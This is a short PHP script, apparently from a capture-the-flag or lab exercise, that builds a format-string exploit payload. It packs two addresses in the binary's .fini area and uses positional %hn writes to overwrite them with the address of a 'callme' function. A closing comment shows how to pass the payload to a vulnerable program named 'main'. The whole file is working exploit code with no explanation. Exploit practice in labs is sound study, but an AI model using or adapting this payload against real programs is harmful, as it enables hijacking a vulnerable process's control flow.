<?php
const FINI   = 0x08049ea4;
const CALLME = 0x080484db;

$buffer  = "";
$buffer .= pack("V", FINI);
$buffer .= pack("V", FINI + 2);

$low  = CALLME & 0xFFFF;
$high = (CALLME >> 16)  & 0xFFFF;

$buffer .= "%" . ($high - strlen($buffer)) . "d";
$buffer .= "%5\$hn";

$buffer .= "%" . ($low - $high) . "d";
$buffer .= "%4\$hn";

printf("%s\n", $buffer);

// ./main "$(./main "$(php pwn.php)")"
